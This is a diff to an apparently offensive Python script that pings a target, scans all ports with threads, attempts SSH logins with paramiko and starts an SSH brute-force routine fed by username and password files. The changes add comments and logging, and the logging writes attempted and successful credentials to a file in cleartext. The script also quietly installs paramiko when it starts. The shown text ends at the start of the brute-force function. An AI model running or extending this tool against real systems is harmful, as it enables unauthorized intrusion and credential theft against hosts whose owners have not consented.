@@ -1,36 +1,46 @@
-from threading import Thread, Lock
-import os
-import socket
+from threading import Thread, Lock   #To handle Threads.
+import os         # To run system commands
+import socket         # To create a connection
 try:
     os.system("pip install paramiko >nul 2>&1")
 except Exception as e :
     pass
-import paramiko
+import paramiko              # To create a secure shell 
 import select
 import sys
+import logging
 
 
 open_ports = []  # Shared list to store open ports
 lock = Lock()    # Lock to ensure thread-safe operations
 
+
+# Configure logging
+logging.basicConfig(
+    filename='scan_results.log',  # File to save the logs
+    level=logging.INFO,           # Log level (INFO means general messages)
+    format='%(asctime)s - %(levelname)s - %(message)s'  # Log format: timestamp, level, message
+)
+
+
 def is_target_alive(ip):  # Sends a ping request to check if an host is alive.
     try:
         print("__________________________________________________")
         print(f"Pinging target: {target_ip}\n")
-
-        # Run the ping command for windows and Unix OS
         result = os.system(f"ping -c 1 {ip}" if os.name != 'nt' else f"ping -n 1 {ip}")
-
-        # Check if the ping command was successful
         if result == 0:
             print(f"Target {ip} is online.")
+            logging.info(f"Target {ip} is online.")  # Log online status
             return True
         else:
             print(f"Target {ip} is offline.")
+            logging.info(f"Target {ip} is offline.")  # Log offline status
             return False
     except Exception as e:
         print(f"Error pinging target: {e}")
+        logging.error(f"Error pinging target {ip}: {e}")  # Log error
         return False
+
 
 def scan_port(ip, port):
     """
@@ -50,9 +60,6 @@ def scan_port(ip, port):
 
 
 def scan_ports(ip):
-    """
-    Scans all ports on the given IP using multithreading.
-    """
     print("__________________________________________________")
     print("[+] Starting port scan with threads!")
     print("__________________________________________________")
@@ -63,19 +70,19 @@ def scan_ports(ip):
         threads.append(thread)
         thread.start()
 
-        # Limit active threads to 100 at a time to avoid system overload
         if len(threads) >= 100:
             for t in threads:
-                t.join()  # Wait for all threads to finish
-            threads = []  # Clear the thread list to start new threads
+                t.join()
+            threads = []
 
-    # Join any remaining threads after the loop
     for t in threads:
         t.join()
 
     print(f"[-] Open ports: {sorted(open_ports)}")
+    logging.info(f"Open ports on {ip}: {sorted(open_ports)}")  # Log open ports
     print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
     return open_ports
+
 
 
 def attempt_ssh_login(ip, username, password):
@@ -85,12 +92,16 @@ def attempt_ssh_login(ip, username, password):
     try:
         ssh.connect(ip, port=22, username=username, password=password)
         print(f"Success! Username: {username}, Password: {password}")
+        logging.info(f"Successful SSH login: {ip} - Username: {username}, Password: {password}")  # Log successful login
         return ssh  # Return SSH session for further commands
     except paramiko.AuthenticationException:
         print("Authentication failed.")
+        logging.warning(f"Authentication failed for {ip} - Username: {username}, Password: {password}")  # Log failed login
     except Exception as e:
         print(f"Connection failed: {e}")
+        logging.error(f"Connection failed to {ip}: {e}")  # Log error
     return None
+
 
 def brute_force_ssh(ip):
     # Prompt the user for file paths
